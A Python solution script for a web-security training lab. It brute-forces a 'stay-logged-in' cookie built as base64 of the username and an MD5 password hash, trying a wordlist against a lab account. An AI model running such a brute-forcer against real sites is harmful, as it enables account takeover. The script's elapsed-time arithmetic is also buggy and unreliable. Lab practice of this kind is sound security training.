#######################################################################
#
# Author: Ahmed Elqalaawy (@elqal3awii)
#
# Date: 30/8/2023
#
# Lab: Brute-forcing a stay-logged-in cookie
#
# Steps: 1. Hash every the password
#        2. Encrypt every tha hash with the username in the cookie
#        3. GET /my-account page with every encrypted cookie
#
#######################################################################


###########
# imports
###########
import requests
import time
from colorama import Fore
import hashlib
import base64


#############################
# Global Variables
#############################
FAILED_PASSWORDS = []
FAILED_PASSWORDS_COUNTER = 0


##################################
# Function to bure force password
##################################
def brute_force_password(start_time, url, valid_user, passwords):
    global FAILED_PASSWORDS
    global FAILED_PASSWORDS_COUNTER

    print(Fore.WHITE + "[#] Brute forcing password of " + Fore.GREEN + f"{valid_user}..")
    
    # get the number of all passwords
    total_passwords = len(passwords) 

    for (index, password) in enumerate(passwords):
        # compute the md5 hash of the password
        password_hash = hashlib.md5(password.encode()).hexdigest()
        
        # encrypt the password hash with username
        cookie_encoded = base64.b64encode(f"{valid_user}:{password_hash}".encode()).decode()
        
        # set headers
        headers = {
            "Cookie": f"stay-logged-in={cookie_encoded}"
        }

        try:  
            # login
            response = requests.get( url=f"{url}/my-account", headers=headers, allow_redirects=False, timeout=5)
        
        except:
            # update the failed counter
            FAILED_PASSWORDS_COUNTER += 1      
            # save the failed password to try it later
            FAILED_PASSWORDS.append(password)
            continue

        # if you successfully logged in
        if response.status_code == 200:  
            print(Fore.WHITE + f"\n✅ Correct pass: " + Fore.GREEN + password)
            
            # calculate the elapsed time
            elapsed_time = int(time.time() - start_time / 60)
            
            print(Fore.GREEN + "✅ Finished in: " + Fore.WHITE + str(elapsed_time) + "minutes")
            
            # exit from the program
            exit(0)
        
        else:
            print(Fore.WHITE + f"[*] ({index}/{total_passwords}) {password:10} => " + Fore.RED + "Incorrect", end='\r', flush=True)
            
            continue
        
        
    
    # if no passwords are found
    return None


###########
# Main
###########

# change this to your lab URL
url = "https://0ac9005c03650bc583a27ae8001d005e.web-security-academy.net"

# change the file path of the password list
passwords = open("/home/ahmed/passwords", 'rt').read().splitlines()

# capture the time before brute forcing
start_time = time.time()

# start brute forcing 
brute_force_password(start_time, url, "carlos", passwords)

# calculate the elapsed time
elapsed_time = int(time.time() - start_time / 60)

print(Fore.GREEN + "✅ Finished in: " + Fore.WHITE + str(elapsed_time) + "minutes")

# print failed passwords
print(Fore.RED + "Failed passwords count: " + Fore.WHITE + str(FAILED_PASSWORDS_COUNTER))
print(Fore.RED + "Failed passwords: " + Fore.WHITE + "[ " + ", ".join(FAILED_PASSWORDS) + " ]")
